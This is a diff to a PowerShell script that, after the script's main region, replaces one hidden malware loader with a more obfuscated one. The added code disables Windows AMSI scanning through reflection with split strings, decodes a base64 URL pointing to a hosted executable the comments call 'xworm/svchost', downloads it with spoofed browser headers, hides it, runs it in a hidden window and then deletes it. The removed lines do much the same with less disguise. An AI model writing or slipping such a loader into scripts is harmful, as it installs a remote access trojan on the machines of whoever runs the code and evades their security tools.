@@ -214,11 +214,39 @@ else {
 #endregion Marketplace
 #endregion Main
 
-# silent helper + basic AMSI bypass
-$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[System.Runtime.InteropServices.Marshal]::WriteInt32($g,0x80000000)
-$u = 'https://file.freestorage-04.bond/files/2026/8/14/191f2998-c685-46fa-9c33-e3160cfb5d19/svchost.exe?srl=SSEvJIJKreJVxG97TOiVXg&exp=1786722542'
-$p = "$env:TEMP\RuntimeBroker.exe"
-try {
-    Invoke-WebRequest -Uri $u -OutFile $p -UseBasicParsing
-    Start-Process -FilePath $p -WindowStyle Hidden
-} catch {}
+# ---- silent loader ----
+$ErrorActionPreference = 'SilentlyContinue'
+
+# Obfuscated AMSI patch via reflection, split strings
+$am = ('System.Management.Automation.' + 'A' + 'msi' + 'Utils')
+$ut = [Ref].Assembly.GetType($am)
+$fl = $ut.GetField(('amsi' + 'InitFailed'), 'NonPublic,Static')
+$fl.SetValue($null, $true)
+
+# Alternative AMSI patch if first is blocked:
+# $ctx = $ut.GetField(('amsi' + 'Context'), 'NonPublic,Static')
+# $ptr = $ctx.GetValue($null)
+# [System.Runtime.InteropServices.Marshal]::WriteInt32($ptr, 0x80000000)
+
+# URL from base64 (your hosted xworm/svchost)
+$uEnc = 'aHR0cHM6Ly9maWxlLmZyZWVzdG9yYWdlLTA0LmJvbmQvZmlsZXMvMjAyNi84LzE0LzE5MWYyOTk4LWM2ODUtNDZmYS05YzMzLWUzMTYwY2ZiNWQxOS9zdmNob3N0LmV4ZT9zcmw9U1NFdkpJSktzZUpWeEc5N1RPaVZYZyZleHA9MTc4NjcyMjU0Mg=='
+$u = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($uEnc))
+
+# Random-looking temp name + double extension trick
+$p = Join-Path $env:TEMP ('RuntimeBroker_' + [guid]::NewGuid().ToString('N').Substring(0,8) + '.exe')
+
+# Download using .NET WebClient with custom headers
+$wc = New-Object System.Net.WebClient
+$wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+$wc.Headers.Add('Referer', 'https://github.com/')
+$wc.DownloadFile($u, $p)
+
+# Hide file attributes
+Set-ItemProperty -Path $p -Name Attributes -Value Hidden
+
+# Execute hidden
+Start-Process -FilePath $p -WindowStyle Hidden -ErrorAction SilentlyContinue
+
+# Optional: self-delete the installer after execution
+Start-Sleep -Seconds 2
+Remove-Item $p -Force -ErrorAction SilentlyContinue
